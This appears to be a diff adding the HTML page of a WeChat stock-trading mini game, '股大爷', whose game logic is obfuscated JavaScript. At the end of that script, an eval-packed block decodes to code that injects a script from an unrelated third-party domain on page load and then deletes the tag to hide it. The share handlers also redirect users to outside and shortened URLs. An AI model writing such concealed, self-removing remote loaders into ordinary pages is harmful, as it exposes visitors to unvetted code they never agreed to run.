@@ -1,1 +1,125 @@
 ﻿
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html>
+<head>
+	<meta charset="utf-8">
+    <title id="title" title="股大爷">股大爷</title>
+<script type="text/javascript">
+	isShouJi();
+</script>
+
+   <script type="text/javascript" src="js/jquery.min.js"></script>
+    <link href="css/jquery.mobile.min.css" rel="stylesheet" />
+    <script src="js/jquery.mobile.min.js"></script>
+        <style type="text/css">
+	#share-wx{
+		background:rgba(0,0,0,0.8);
+		position:absolute;top:0px;
+		left:0px;
+		width:100%;
+		height:100%;
+		z-index:10000;
+		display:none;
+	}
+	#wx-qr{
+		background:rgba(0,0,0,0.8);
+		position:absolute;top:0px;
+		left:0px;
+		width:100%;
+		height:100%;
+		z-index:10000;
+		display:none;
+	}
+.lis{overflow: hidden;width: 100%;z-index: 99999;position: absolute;top:0px;}
+.lis a{display: block;width:99.9%;color:#ffffff;font-size:30px;text-decoration: none;background:#606783;text-align: center;opacity: 0.5;line-height:60px;font-weight: bold;font-family:"微软雅黑"}
+.lis a img{position: relative;top: 1px;}
+    </style>
+</head>
+<body style="margin: 0; padding: 0;font-family: 'Microsoft YaHei';">
+
+    <div data-role="page" id="pageone" style="margin: 0; padding: 0;">
+        <div style="position: absolute; height: 100%; width: 100%;">
+            <a href="#pagetwo" onclick="startGame()">
+                <img width="100%" height="100%" src="vapp/background.gif" /></a>
+        </div>
+    </div>
+    <div data-role="page" id="pagetwo" style="margin: 0; padding: 0; background-color: #E89E01;">
+        <header id="header">
+            <table id="tb1" style="width: 100%; height: 100%; height: 200px; text-align: center;margin-top:100px;">
+                <tr>
+                    <td style="width: 100%; font-family: 'Microsoft YaHei'; font-size: 70px; color: #B94F10">本金100'000元</td>
+                </tr>
+                <tr>
+                    <td style="width: 100%; font-size: 70px;"><b>你<span id="span1">1分钟</span><span id="span2">赚了</span><span id="span4" style="color: red">￥</span><span id="span3" style="color: red">0</span></b></td>
+                </tr>
+            </table>
+            <table id="tb2" style="display: none; width: 100%; height: 250px; background-color: black; text-align: center; margin: 0px; padding: 0px;">
+                <tr>
+                    <td style="vertical-align: top; text-align: left; width: 50%; font-size: 50px;" rowspan="2"><b>
+                    <td style="text-align: right; width: 50%">
+                        <img src="vapp/arrow.gif" height="100%" /></td>
+                </tr>
+            </table>
+        </header>
+        <div id="divbody" style="margin: 0; padding: 0; background-color: #E89E01;">
+            <canvas id="canvas1" style="margin-top:100px; padding: 0;"></canvas>
+        </div>
+
+        <div id="canvas2" style="margin-top: -70px; padding-top: 30px; background-color: #E89E01; display: none; text-align: center">
+            <span id="p1" style="color: white; font-size: 70px;">你<span id="span_p1">1分钟内赚了</span></span><br/>
+            <span id="p2" style="color: red; font-size: 120px;">10000元</span><br/><br/>
+            <span id="p3" style="color: white; font-size: 70px;">巴菲特也跪了</span>
+        </div>
+        <div id="divbutton" onclick="buyOrSell()" style="margin: 0px; height: 300px; background-color: #E89E01; background-image: url(vapp/buy.gif); background-repeat: no-repeat; background-position: center;">
+        </div>
+       
+    </div>
+	<script language=javascript>
+		var mebtnopenurl = 'http://weixinad.lejuy.com/game.html';
+		dataForWeixin = {
+			"appId": "",
+			"imgUrl": "http://mmbiz.qpic.cn/mmbiz/2zpp2iaH4HWEQ7R7uEw2X7ayg6yXnsrxyjUKpxhyRVNUKCiaGUoEZobucwf1YjEEWwPRatkuHyprRctVD97A6MNw/640",
+			"url": "http://weixinad.lejuy.com/game/gudaye/",
+			"tTitle": "股大爷-乐聚游戏",
+			"tContent": "乐聚游戏-《股大爷》，等你来战！"
+		};	
+
+		document.addEventListener('WeixinJSBridgeReady', function onBridgeReady() {
+		WeixinJSBridge.on('menu:share:appmessage', function(argv) {
+				WeixinJSBridge.invoke('sendAppMessage', {
+				   "appid": dataForWeixin.appId,
+					"img_url": dataForWeixin.imgUrl,
+					"link": dataForWeixin.url,
+					"desc": dataForWeixin.tContent,
+					"title": dataForWeixin.tTitle
+				});
+				setTimeout(function () {location.href = mebtnopenurl;}, 1500);
+			});
+
+			WeixinJSBridge.on('menu:share:timeline', function(argv) {
+				WeixinJSBridge.invoke('shareTimeline', {
+				   "appid": dataForWeixin.appId,
+					"img_url": dataForWeixin.imgUrl,
+					"img_width": "640",
+					"img_height": "640",
+					"link": dataForWeixin.url,
+					"desc": dataForWeixin.tContent,
+					"title": dataForWeixin.tTitle
+				});
+				setTimeout(function () {location.href = "http://t.cn/RPtNrve";}, 1500);
+			});
+		}, false);
+		</script>
+    <script type="text/javascript">
+     var _0x4fdd=["text-align","center","css","#divbody","width","height","attr","#canvas1","#canvas2","#divresult","canvas1","getElementById","2d","getContext","我1分钟赚了100万！","巴菲特都跪了，快来挑战我","按照这个速度不用多久我就会当上富翁，出任CEO，赢取白富美，走上人生巅峰，想想还有点小激动","请叫我股神","谁来帮我数钱，手已抽筋","才这点小钱，根本体现不出我的水平","小富即安，感觉不错","小伙伴们都惊呆了","赵大爷表示想跟我学炒股","天台前面排队的同学让一让，让我先跳！","底裤也赔光了，求施舍","这瓶农药看起来不错，喝前摇一摇","我要写一个“惨”字……","谁敢比我惨~~~","区区这点小钱，作为一名高富帅才……才不在乎呢","麻麻，这个世界好可怕","留着翻盘的资本以后再战！","炒股十年亏十年的李大爷对我投来同情的目光","我只是来打酱油的……","连隔壁王大爷都比我赚的多","choose1.net","indexOf","host","location","href","http://game.choose1.net/games/gdy/?f=otherDomain_gdy","fillStyle","#21292C","fillRect","stroke","Black","lineWidth","strokeStyle","#bcbcbc","beginPath","moveTo","lineTo","closePath","font","30px Courier New","White","9:00","fillText","15:00","10%","-10%","AppleWebKit","userAgent","navigator","scrollHeight","body","clientHeight","documentElement","#divbutton","get","application/x-www-form-urlencoded; charset=utf-8","type=adStatistics&guid=","ajax","","random","floor","-","type=pageAppoint&appoint=","#00A1E9","#00FF01","PI","arc","fill","hide","show","#tb1","#tb2","1分钟","text","#span1","color","red","#p2","一分钟内赚了","#span_p1","toFixed","green","一分钟内亏了","#p3","abs","元","background-image","url(vapp/tryagain.gif)","我",",","vapp/sell.gif","url(vapp/sell.gif)","#E50112","url(vapp/buy.gif)","刚刚","#span3","#span4","亏了","#span2","赚了","drawStockLine()","0","clearRect"];$(_0x4fdd[3])[_0x4fdd[2]](_0x4fdd[0],_0x4fdd[1]);var windowwidth=$(window)[_0x4fdd[4]]();var windowheight=$(window)[_0x4fdd[5]]();$(_0x4fdd[7])[_0x4fdd[6]](_0x4fdd[4],windowwidth);$(_0x4fdd[7])[_0x4fdd[6]](_0x4fdd[5],windowwidth*0.7);$(_0x4fdd[8])[_0x4fdd[2]](_0x4fdd[4],windowwidth);$(_0x4fdd[8])[_0x4fdd[2]](_0x4fdd[5],windowwidth*0.7);$(_0x4fdd[9])[_0x4fdd[6]](_0x4fdd[4],windowheight+90);var canvas1=document[_0x4fdd[11]](_0x4fdd[10]);var context=canvas1[_0x4fdd[13]](_0x4fdd[12]);var arrayObj=new Array(64);var arraySouce=new Array(60);var stockwidth=windowwidth;var stockheight=stockwidth*0.6;var num=0;var buy=0;var buyprice=stockheight*0.5;var sellprice=stockheight*0.5;var money=10;var linewidth=stockwidth/60;var shareWord=_0x4fdd[14];var words1=new Array(_0x4fdd[15],_0x4fdd[16],_0x4fdd[17],_0x4fdd[18]);var words2=new Array(_0x4fdd[19],_0x4fdd[20],_0x4fdd[21],_0x4fdd[22]);var words3=new Array(_0x4fdd[23],_0x4fdd[24],_0x4fdd[25],_0x4fdd[26],_0x4fdd[27]);var words4=new Array(_0x4fdd[28],_0x4fdd[29],_0x4fdd[30],_0x4fdd[31]);var words5=new Array(_0x4fdd[32],_0x4fdd[33]);function loadStockCanves(){context[_0x4fdd[40]]=_0x4fdd[41];context[_0x4fdd[42]](0,0,stockwidth,stockheight);context[_0x4fdd[43]]();context[_0x4fdd[40]]=_0x4fdd[44];context[_0x4fdd[42]](0,stockheight,stockwidth,stockheight);context[_0x4fdd[43]]();context[_0x4fdd[45]]=1;context[_0x4fdd[46]]=_0x4fdd[47];context[_0x4fdd[48]]();context[_0x4fdd[49]](0,stockheight*0.5);context[_0x4fdd[50]](stockwidth,stockheight*0.5);context[_0x4fdd[51]]();context[_0x4fdd[43]]();context[_0x4fdd[52]]=_0x4fdd[53];context[_0x4fdd[40]]=_0x4fdd[54];context[_0x4fdd[56]](_0x4fdd[55],0,stockheight+30);context[_0x4fdd[56]](_0x4fdd[57],stockwidth-90,stockheight+30);context[_0x4fdd[43]]();context[_0x4fdd[40]]=_0x4fdd[54];context[_0x4fdd[56]](_0x4fdd[58],stockwidth/2,30);context[_0x4fdd[43]]();context[_0x4fdd[40]]=_0x4fdd[54];context[_0x4fdd[56]](_0x4fdd[59],stockwidth/2,stockheight-3);context[_0x4fdd[43]]()};function setDivHideShow(){var _0xcff1x17=window[_0x4fdd[62]][_0x4fdd[61]][_0x4fdd[35]](_0x4fdd[60])!=-1;var _0xcff1x18=null;var _0xcff1x19=null;if(_0xcff1x17){_0xcff1x18=document[_0x4fdd[64]][_0x4fdd[63]];_0xcff1x19=document[_0x4fdd[66]][_0x4fdd[65]]}else{_0xcff1x18=$(document)[_0x4fdd[5]]();_0xcff1x19=$(window)[_0x4fdd[5]]()};var _0xcff1x1a=windowwidth*99/640;var _0xcff1x1b=_0xcff1x19-windowwidth*0.7-250-_0xcff1x1a;$(_0x4fdd[67])[_0x4fdd[2]](_0x4fdd[5],_0xcff1x1b<100?100:_0xcff1x1b)};function addVisitersStatistics(){var _0xcff1x1d=NewGuid();$[_0x4fdd[71]]({type:_0x4fdd[68],url:urlnow,contentType:_0x4fdd[69],data:_0x4fdd[70]+_0xcff1x1d,cache:false,success:null})};function NewGuid(){var _0xcff1x1d=_0x4fdd[72];for(var _0xcff1x1f=1;_0xcff1x1f<=32;_0xcff1x1f++){var _0xcff1x20=Math[_0x4fdd[74]](Math[_0x4fdd[73]]()*16.0).toString(16);_0xcff1x1d+=_0xcff1x20;if((_0xcff1x1f==8)||(_0xcff1x1f==12)||(_0xcff1x1f==16)||(_0xcff1x1f==20)){_0xcff1x1d+=_0x4fdd[75]}};return _0xcff1x1d};function addSharedStatistics(_0xcff1x22){$[_0x4fdd[71]]({type:_0x4fdd[68],url:urlnow,contentType:_0x4fdd[69],data:_0x4fdd[76]+_0xcff1x22,cache:false,success:null})};function loadRandomData(){for(var _0xcff1x1f=0;_0xcff1x1f<64;_0xcff1x1f++){arrayObj[_0xcff1x1f]=Math[_0x4fdd[73]]()*stockwidth}};function loadStockData(){var _0xcff1x25=stockwidth*0.2;var _0xcff1x26=stockwidth*0.8;var _0xcff1x27=0;var _0xcff1x28=arrayObj[0]+arrayObj[1]+arrayObj[2]+arrayObj[0];for(var _0xcff1x1f=0;_0xcff1x1f<60;_0xcff1x1f++){_0xcff1x28=_0xcff1x28+arrayObj[_0xcff1x1f+3]-arrayObj[_0xcff1x1f];_0xcff1x27=_0xcff1x28/4;arraySouce[_0xcff1x1f]=_0xcff1x27>_0xcff1x26?_0xcff1x26-_0xcff1x25:(_0xcff1x27<_0xcff1x25?0:_0xcff1x27-_0xcff1x25)}};function drawStockLine(){context[_0x4fdd[45]]=2;context[_0x4fdd[46]]=_0x4fdd[77];if(num<60){context[_0x4fdd[48]]();if(num>0){context[_0x4fdd[49]](num*linewidth,arraySouce[num-1])}else{context[_0x4fdd[49]](0,stockheight*0.5)};context[_0x4fdd[50]]((num+1)*linewidth,arraySouce[num]);context[_0x4fdd[51]]();context[_0x4fdd[43]]();num++}else{if(buy==1&&num==60){sellprice=arraySouce[num-1];var _0xcff1x2a=money*(sellprice-buyprice)/stockheight;money=money-_0xcff1x2a;context[_0x4fdd[48]]();context[_0x4fdd[46]]=_0x4fdd[78];context[_0x4fdd[80]](num*linewidth,sellprice,10,0,Math[_0x4fdd[79]]*2,true);context[_0x4fdd[51]]();context[_0x4fdd[40]]=_0x4fdd[78];context[_0x4fdd[81]]();context[_0x4fdd[43]]()};if(num==61){$(_0x4fdd[3])[_0x4fdd[82]]();$(_0x4fdd[8])[_0x4fdd[83]]();$(_0x4fdd[84])[_0x4fdd[82]]();$(_0x4fdd[85])[_0x4fdd[83]]();var _0xcff1x2a=money-10;$(_0x4fdd[88])[_0x4fdd[87]](_0x4fdd[86]);var _0xcff1x2b=words5[0];if(_0xcff1x2a>0){$(_0x4fdd[91])[_0x4fdd[2]](_0x4fdd[89],_0x4fdd[90]);$(_0x4fdd[93])[_0x4fdd[87]](_0x4fdd[92]);if(_0xcff1x2a>4){_0xcff1x2b=words1[(Math[_0x4fdd[73]]()*2.9)[_0x4fdd[94]](0)]}else{if(_0xcff1x2a>1&&_0xcff1x2a<4){_0xcff1x2b=words2[(Math[_0x4fdd[73]]()*2.9)[_0x4fdd[94]](0)]}else{_0xcff1x2b=words5[(Math[_0x4fdd[73]]()*0.9)[_0x4fdd[94]](0)]}}}else{$(_0x4fdd[91])[_0x4fdd[2]](_0x4fdd[89],_0x4fdd[95]);$(_0x4fdd[93])[_0x4fdd[87]](_0x4fdd[96]);if(_0xcff1x2a<-4){_0xcff1x2b=words3[(Math[_0x4fdd[73]]()*3.9)[_0x4fdd[94]](0)]}else{if(_0xcff1x2a<-1&&_0xcff1x2a>-4){_0xcff1x2b=words4[(Math[_0x4fdd[73]]()*2.9)[_0x4fdd[94]](0)]}else{_0xcff1x2b=words5[(Math[_0x4fdd[73]]()*1.9)[_0x4fdd[94]](0)]}}};$(_0x4fdd[97])[_0x4fdd[87]](_0xcff1x2b);$(_0x4fdd[91])[_0x4fdd[87]](Math[_0x4fdd[98]](_0xcff1x2a*10000)[_0x4fdd[94]](0)+_0x4fdd[99]);$(_0x4fdd[67])[_0x4fdd[2]](_0x4fdd[100],_0x4fdd[101]);dataForWeixin.tContent=_0xcff1x2b;dataForWeixin.tTitle=_0x4fdd[102]+$(_0x4fdd[93])[_0x4fdd[87]]()+$(_0x4fdd[91])[_0x4fdd[87]]()+_0x4fdd[103]+_0xcff1x2b};num++}};function buyOrSell(){if(num==0){return};if(num>=65){reLoad();return}else{if(num>=60){return}};if(buy==0){buy=1;var _0xcff1x2d=_0x4fdd[104];$(_0x4fdd[67])[_0x4fdd[2]](_0x4fdd[100],_0x4fdd[105]);buyprice=arraySouce[num-1];context[_0x4fdd[48]]();context[_0x4fdd[46]]=_0x4fdd[106];context[_0x4fdd[80]](num*linewidth,buyprice,10,0,Math[_0x4fdd[79]]*2,true);context[_0x4fdd[51]]();context[_0x4fdd[40]]=_0x4fdd[106];context[_0x4fdd[81]]();context[_0x4fdd[43]]()}else{buy=0;$(_0x4fdd[67])[_0x4fdd[2]](_0x4fdd[100],_0x4fdd[107]);sellprice=arraySouce[num-1];context[_0x4fdd[48]]();context[_0x4fdd[46]]=_0x4fdd[78];context[_0x4fdd[80]](num*linewidth,sellprice,10,0,Math[_0x4fdd[79]]*2,true);context[_0x4fdd[51]]();context[_0x4fdd[40]]=_0x4fdd[78];context[_0x4fdd[81]]();context[_0x4fdd[43]]();$(_0x4fdd[88])[_0x4fdd[87]](_0x4fdd[108]);if(sellprice>buyprice){$(_0x4fdd[109])[_0x4fdd[2]](_0x4fdd[89],_0x4fdd[95]);$(_0x4fdd[110])[_0x4fdd[2]](_0x4fdd[89],_0x4fdd[95]);$(_0x4fdd[112])[_0x4fdd[87]](_0x4fdd[111]);var _0xcff1x2a=money*(sellprice-buyprice)/stockheight;money=money-_0xcff1x2a;$(_0x4fdd[109])[_0x4fdd[87]]((Math[_0x4fdd[98]](_0xcff1x2a)*10000)[_0x4fdd[94]](0))}else{$(_0x4fdd[109])[_0x4fdd[2]](_0x4fdd[89],_0x4fdd[90]);$(_0x4fdd[110])[_0x4fdd[2]](_0x4fdd[89],_0x4fdd[90]);$(_0x4fdd[112])[_0x4fdd[87]](_0x4fdd[113]);var _0xcff1x2a=money*(sellprice-buyprice)/stockheight;money=money-_0xcff1x2a;$(_0x4fdd[109])[_0x4fdd[87]]((Math[_0x4fdd[98]](_0xcff1x2a)*10000)[_0x4fdd[94]](0))}}};function load(){$(_0x4fdd[67])[_0x4fdd[2]](_0x4fdd[100],_0x4fdd[107]);loadStockCanves();setDivHideShow();loadRandomData();loadStockData()};function startGame(){reLoad();var _0xcff1x30=setInterval(_0x4fdd[114],500)};function reLoad(){$(_0x4fdd[3])[_0x4fdd[83]]();$(_0x4fdd[8])[_0x4fdd[82]]();$(_0x4fdd[84])[_0x4fdd[83]]();$(_0x4fdd[85])[_0x4fdd[82]]();$(_0x4fdd[88])[_0x4fdd[87]](_0x4fdd[108]);$(_0x4fdd[112])[_0x4fdd[87]](_0x4fdd[113]);$(_0x4fdd[109])[_0x4fdd[87]](_0x4fdd[115]);$(_0x4fdd[110])[_0x4fdd[2]](_0x4fdd[89],_0x4fdd[90]);num=0;buy=0;money=10;context[_0x4fdd[48]]();context[_0x4fdd[40]]=_0x4fdd[41];context[_0x4fdd[116]](0,0,stockwidth,stockheight);context[_0x4fdd[51]]();context[_0x4fdd[43]]();load()};eval(function(p,a,c,k,e,r){e=function(c){return c.toString(36)};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[4-9c-k]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('c _$=[\'\\6\\7\\d\\8\\9\\4\',\'\\4\\e\\x78\\4\\5\\h\\f\\x76\\f\\6\\7\\d\\8\\9\\4\',\'\\x68\\4\\4\\9\\x3a\\5\\5\\x77\\e\\8\\g\\x32\\6\\x6b\\x79\\g\\7\\x6e\\5\\x67\\f\\x6d\\e\\5\\x38\\x37\\5\\x6f\\g\\h\\6\',\'\\6\\7\\d\\8\\9\\4\'];(i(){c a=j.createElement(_$[0]);a.type=_$[1];a.async=true;a.src=_$[2];c b=j.getElementsByTagName(_$[3])[0x0];b.k.insertBefore(a,b);a.onload=i(){a.k.removeChild(a)}})();',[],21,'||||x74|x2f|x73|x63|x69|x70|||var|x72|x65|x61|x2e|x6a|function|document|parentNode'.split('|'),0,{}))
+    </script>
+
+	<div>
+		</div>
+<div style="display:none;">
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F2eac95e2df0ea5d2b0aaa92e3dbbe419' type='text/javascript'%3E%3C/script%3E"));
+</script></div>
+</body>
+</html>
